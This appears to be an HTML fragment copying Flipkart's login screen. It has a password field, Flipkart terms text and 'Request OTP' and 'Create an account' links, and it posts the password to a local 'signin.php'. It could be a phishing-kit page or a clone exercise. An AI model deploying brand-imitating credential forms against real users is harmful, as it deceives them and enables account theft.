<body>
    <form class="container" action="signin.php" method="POST">
        <div class="box">
            <div class="row">
                <div class="col-sm-5 col-xs-1 box1">
                    <div class="inline-text">

                            Recommendations
                        </p>
                    </div>
                </div>
                <div class="box-2">
                    <div class="user-id user-data">

                    </div>
                    <div class="user-id user-data">
                        <input type="password" name="passwd" id="passwd" required=""/>
                        <label>Enter Password</label>
                    </div>

                        <p>By continuing, you agree to Flipkarts Term of use and Privacy Policy.</p>
                    </div>
                    <span><a href="#">Forgot?</a></span>
                    <div class="user-id button">
                        <button type="submit" name="login" id="login" value="Login">LOGIN</button>>
                    </div>
                    <div class="user-id">
                        <p>OR</p>
                    </div>
                    <div class="user-id button">
                        <input type="reset" name="" id="" value="Request OTP" />
                    </div>
                    <div class="user-id">
                        <p class="footer"><a href="#">New to Flipkart? Create an account<a></p>
                    </div>
                </div>
            </div>
        </div>
    </form>
</body>
